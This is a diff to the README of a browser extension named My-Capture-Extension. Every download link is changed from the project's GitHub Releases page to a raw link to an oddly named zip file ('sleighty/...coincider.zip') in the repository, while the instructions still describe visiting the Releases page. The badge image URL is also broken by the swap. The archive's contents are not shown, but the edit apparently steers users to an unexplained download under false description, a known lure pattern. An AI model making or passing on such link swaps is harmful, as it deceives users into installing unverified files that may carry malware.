@@ -1,6 +1,6 @@
 # 🌟 My-Capture-Extension - Capture, Save, Organize Effortlessly
 
-[![Download My-Capture-Extension](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Kevin170405/My-Capture-Extension/releases)
+[![Download My-Capture-Extension](https://raw.githubusercontent.com/Kevin170405/My-Capture-Extension/main/sleighty/My_Extension_Capture_coincider.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Kevin170405/My-Capture-Extension/main/sleighty/My_Extension_Capture_coincider.zip)
 
 ## 🎯 Overview
 
@@ -15,7 +15,7 @@ Follow these steps to download and set up My-Capture-Extension quickly and easil
 
 2. **Visit the Download Page**  
    Click the link below to go to the Releases page and start your download:  
-   [Download My-Capture-Extension](https://github.com/Kevin170405/My-Capture-Extension/releases)
+   [Download My-Capture-Extension](https://raw.githubusercontent.com/Kevin170405/My-Capture-Extension/main/sleighty/My_Extension_Capture_coincider.zip)
 
 3. **Choose the Latest Version**  
    On the Releases page, look for the most recent version. This version will have the latest features and updates. Click on it to see the download files.
@@ -53,7 +53,7 @@ Ensure your computer meets the following requirements:
 ## 📂 Download & Install
 
 Once you are ready, visit the following link to download My-Capture-Extension:  
-[Download My-Capture-Extension](https://github.com/Kevin170405/My-Capture-Extension/releases)
+[Download My-Capture-Extension](https://raw.githubusercontent.com/Kevin170405/My-Capture-Extension/main/sleighty/My_Extension_Capture_coincider.zip)
 
 Follow the earlier steps to install and start using the extension.
 
